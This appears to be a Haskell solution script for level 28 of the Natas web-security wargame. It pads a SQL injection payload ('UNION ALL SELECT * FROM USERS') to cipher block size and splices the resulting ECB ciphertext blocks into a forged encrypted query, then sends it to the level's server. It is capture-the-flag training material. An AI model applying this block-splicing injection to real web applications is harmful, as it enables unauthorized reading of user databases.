{-# LANGUAGE OverloadedStrings #-}

module Natas.Natas28 where

import qualified Data.ByteString        as B
import           Data.ByteString.Base64 (decodeLenient, encode)
import           Data.ByteString.Lazy   (ByteString, toStrict)
import           Data.Text              (Text)
import qualified Data.Text              as T
import           Data.Text.Encoding     (decodeUtf8, encodeUtf8)
import           Safe                   (headMay)

import           Network.HTTP.Types.URI (urlDecode, urlEncode)
import           Network.Wreq           (partText, redirects, responseHeader)

import           Control.Lens

import           Natas.Natas
import           Natas.Parse

solution :: Solution
solution = do
  let sql = "' UNION ALL SELECT * FROM USERS; #"
      leftpad = T.replicate 10 "A"
      rightpad = T.replicate (16 - (T.length sql `mod` 16)) "B"
  fcaught <- retrieveEncoded (T.concat [leftpad])
  print fcaught
  scaught <- retrieveEncoded (T.concat [leftpad, sql, rightpad])
  let encrypted = (T.take 48 . T.drop 48) scaught
  print $
    (urlEncode True . encode . B.concat . fmap (decodeLenient . encodeUtf8))
      [T.take 64 fcaught, encrypted, T.drop 64 fcaught]
  pure Nothing

retrieveEncoded :: Text -> IO Text
retrieveEncoded submitText = do
  let req =
        postLevel'
          28
          (parentUri 28)
          (redirects .~ 0)
          (partText "query" submitText)
  Just caught <- catchResponseHandler extract (extract <$> req)
  print (T.chunksOf 16 caught)
  pure caught
  where
    extract =
      headMay .
      drop 1 .
      T.splitOn "query=" .
      decodeUtf8 . urlDecode True . view (responseHeader "Location")
